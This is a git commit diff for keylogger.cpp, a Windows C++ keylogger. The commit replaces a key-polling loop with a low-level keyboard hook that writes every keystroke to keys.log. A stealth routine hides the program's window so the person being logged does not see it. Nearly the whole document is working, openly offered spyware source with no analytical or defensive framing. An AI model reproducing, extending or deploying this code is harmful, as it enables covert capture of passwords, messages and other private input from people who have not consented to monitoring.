ed12960d939c9df054d2e3cbd59e9214f957fe6a
cru3za <cru3za@gmail.com>
2020-04-18 18:01:12 -0300

    Update keylogger.cpp

--- keylogger.cpp
+++ keylogger.cpp
@@ -1,20 +1,20 @@
-#include <fstream>
-#include <Windows.h>
 #include <stdio.h>
+#include <iostream>
+#include <windows.h>
+#include <string>
+#include <fstream>
 #pragma comment(lib, "Ws2_32.lib")
 
 using namespace std;
 
-// write text to file
-void writeData(string text)
-{
-	ofstream file;
-	file.open("Keylogs.txt", fstream::app);
-	file << text;
-	file.close();
-}
+HHOOK hKeyHook;
+KBDLLHOOKSTRUCT kbdStruct;
+BYTE keyState[256];
+WCHAR buffer[16];
+char systemPath[MAX_PATH];
+char pathtofile[MAX_PATH];
+HMODULE GetModH = GetModuleHandle(NULL);
 
-// hides the keylogger so that it isn't visible
 void stealth()
 {
 	HWND hwnd;
@@ -23,78 +23,99 @@ void stealth()
 	ShowWindow(hwnd, 0);
 }
 
-// this method is to write to the file the special cases of keyboard inputs
-bool isKeyListed(int vKey) 
-{
-	switch (vKey) 
-	{
-	case VK_RETURN:
-		writeData("\n");
-		break;
-	case VK_BACK:
-		writeData(" [BACKSPACE] ");
-		break;
-	case VK_SPACE:
-		writeData(" ");
-		break;
-	case VK_SHIFT:
-		writeData(" [SHIFT] ");
-		break;
-	case VK_OEM_PERIOD:
-		writeData(".");
-		break;
-	default: return false;
+string dayOfTheWeek(int code){
+	string dayName;
+
+	switch (code){
+     	case 0: dayName = "[SUNDAY]"; break;
+		case 1: dayName = "[MONDAY]"; break;
+		case 2: dayName = "[TUESDAY]"; break;
+		case 3: dayName = "[WENSDAY]"; break;
+		case 4: dayName = "[THURSDAY]"; break;
+		case 5: dayName = "[FRIDAY]"; break;
+		case 6: dayName = "[SATURDAY]"; break;
+		default:
+			dayName = "[UNKOWN]";
 	}
-	return 0;
+
+	return dayName;
 }
 
-int main()
-{
-	stealth();  // hides application
-	char Key;
-	string test = "";
-	
-	while (1) 
-	{
-		for (Key = 8; Key <= 255; Key++)
-		{
-			if (GetAsyncKeyState(Key) == -32767) 
-			{
-				if (isKeyListed(Key) == 0)
-				{
-					// initialize ofstream object
-					ofstream LogFile;
-					LogFile.open("Keylogs.txt", fstream::app);
-					// writes the character to the text file
-					LogFile << Key;
-					// close stream
-					LogFile.close();
-				}
-			}
-			// gets the window information
-			char name[200];
-			memset(name, 0, sizeof(name));
-			GetWindowText(GetForegroundWindow(), name, sizeof(name));
-			// store information as string
-			string str(name);
-			// if same, don't write, else write 
-			// this prevents the same info repeated twice in a row
-			if (test.compare(str) != 0)
-			{
-				// initializae ofstream object
-				ofstream file;
-				file.open("Keylogs.txt", fstream::app);
-				// change test so that it prevents same info being written
-				test = str;
-				// text that will be written on the file
-				string title = "\nActive Window Title: " + str + "\n";
-				// writes string onto file
-				file << title;
-				// close stream
-				file.close();
-			}
+LRESULT WINAPI KeyBoardHookupProcedure(int nCode, WPARAM wParam, LPARAM lParam){
 
+    stealth();
+
+	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))){
+		FILE *LOG;
+		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+
+		LOG = fopen("keys.log", "a");
+
+		switch ((unsigned int)kbdStruct.vkCode) {
+
+		case 0xA1: fprintf(LOG, "[right shift down]"); break;
+		case 0xA0: fprintf(LOG, "[shift down]"); break;
+		case 0x8: fprintf(LOG, "[backspace]"); break;
+		case 0xD: fprintf(LOG, "\n"); break;
+		case 0x1B: fprintf(LOG, "[esc]"); break;
+		case 0x9: fprintf(LOG, "[tab]"); break;
+		case 0x2E: fprintf(LOG, "[delete]"); break;
+		case 0xA4: fprintf(LOG, "[alt]"); break;
+		case 0x25: fprintf(LOG, "[left]"); break;
+		case 0x26: fprintf(LOG, "[up]"); break;
+		case 0x27: fprintf(LOG, "[right]"); break;
+		case 0x28: fprintf(LOG, "[down]"); break;
+		case 0xA3: fprintf(LOG, "[ctrl]"); break;
+		case VK_END:     fprintf(LOG, "[END]");  break;
+		case VK_HOME:    fprintf(LOG,"[HOME]"); break;
+		case VK_SELECT:  fprintf(LOG, "[SELECT]"); break;
+		case VK_PRINT:   fprintf(LOG, "[PRINT]");  break;
+		case VK_SNAPSHOT: fprintf(LOG, "[PRINTSCRN]");  break;
+		case VK_INSERT:  fprintf(LOG, "[INSERT]");  break;
+		case VK_HELP:    fprintf(LOG, "[HELP]");  break;
+		case VK_CAPITAL:  fprintf(LOG, "[CAPS-LOCK]"); break;
+
+		default:
+			GetKeyboardState((PBYTE)&keyState);
+			ToUnicode(kbdStruct.vkCode, kbdStruct.scanCode, (PBYTE)&keyState, (LPWSTR)&buffer, sizeof(buffer) / 2, 0);
+			fprintf(LOG, "%c", buffer[0]);
+			break;
 		}
-		
+		fclose(LOG);
+
 	}
+
+	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))){
+        stealth();
+		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+		FILE *LOG;
+		LOG = fopen("keys.log", "a");
+		switch ((unsigned int)kbdStruct.vkCode) {
+		case 0xA1:
+			fprintf(LOG, "[right shift up]");
+			break;
+		case 0xA0:
+			fprintf(LOG, "[left shift up]");
+			break;
+		}
+		fclose(LOG);
+	}
+
+	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow){
+    stealth();
+	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyBoardHookupProcedure, GetModuleHandle(NULL), 0);
+
+	MSG message;
+
+
+	while (GetMessage(&message, NULL, 0, 0)){
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+	}
+
+	UnhookWindowsHookEx(hKeyHook);
+	return 0;
 }
